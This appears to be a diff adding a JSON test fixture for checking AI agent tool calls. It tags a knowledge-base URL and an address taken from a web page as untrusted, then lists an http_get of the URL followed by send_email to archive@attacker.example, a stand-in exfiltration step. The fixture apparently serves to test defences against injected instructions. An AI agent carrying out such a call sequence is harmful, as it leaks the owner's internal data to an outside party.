@@ -1,0 +1,34 @@
+{
+ "values": {
+  "k": {
+   "text": "https://kb.owner.example/a",
+   "labels": [
+    "untrusted:internal-kb"
+   ]
+  },
+  "w": {
+   "text": "archive@attacker.example",
+   "labels": [
+    "untrusted:web_page"
+   ]
+  }
+ },
+ "calls": [
+  {
+   "tool": "http_get",
+   "args": {
+    "url": {
+     "ref": "k"
+    }
+   }
+  },
+  {
+   "tool": "send_email",
+   "args": {
+    "to": {
+     "ref": "w"
+    }
+   }
+  }
+ ]
+}
